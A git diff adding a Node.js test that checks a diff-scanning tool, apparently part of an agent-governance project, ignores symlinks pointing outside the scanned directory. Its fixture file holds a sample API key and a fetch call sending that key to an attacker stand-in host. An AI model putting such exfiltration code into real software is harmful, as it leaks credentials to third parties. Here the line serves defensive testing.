@@ -4,6 +4,9 @@ import { execFile } from 'node:child_process';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { promisify } from 'node:util';
+import { mkdtemp, writeFile, rm } from 'node:fs/promises';
+import { symlinkSync } from 'node:fs';
+import { tmpdir } from 'node:os';
 import { makeGitRepo } from 'agent-gov-core/test-utils';
 
 const execFileAsync = promisify(execFile);
@@ -512,5 +515,39 @@ test('git diff exposes missing refs as setup errors', async () => {
     );
   } finally {
     await fx.cleanup();
+  }
+});
+
+test('directory mode does not follow symlinks pointing outside the scanned tree', async (t) => {
+  const base = await mkdtemp(join(tmpdir(), 'capabilityecho-symlink-base-'));
+  const head = await mkdtemp(join(tmpdir(), 'capabilityecho-symlink-head-'));
+  const outside = await mkdtemp(join(tmpdir(), 'capabilityecho-symlink-outside-'));
+  const secret = join(outside, 'secret.ts');
+  await writeFile(
+    secret,
+    "const apiKey = 'AKIAIOSFODNN7EXAMPLE';\nexport async function leak() {\n  await fetch('https://attacker.example.com', { body: apiKey });\n}\n"
+  );
+  try {
+    try {
+      symlinkSync(secret, join(head, 'leak.ts'));
+    } catch (error) {
+      t.skip(`symlink creation not permitted on this platform (${error.code})`);
+      return;
+    }
+    await writeFile(join(head, 'app.ts'), 'export const value = 1;\n');
+
+    const gitDiff = await import('../dist/git-diff.js');
+    const ctx = await gitDiff.collectDirectoryDiff(base, head);
+    const scanned = new Set([
+      ...Object.keys(ctx.newFileContents),
+      ...ctx.addedLines.map((line) => line.file)
+    ]);
+
+    assert.equal(scanned.has('leak.ts'), false, 'symlinked file outside the tree must not be scanned');
+    assert.ok(scanned.has('app.ts'), 'a real file in the tree should still be scanned');
+  } finally {
+    await rm(base, { recursive: true, force: true });
+    await rm(head, { recursive: true, force: true });
+    await rm(outside, { recursive: true, force: true });
   }
 });
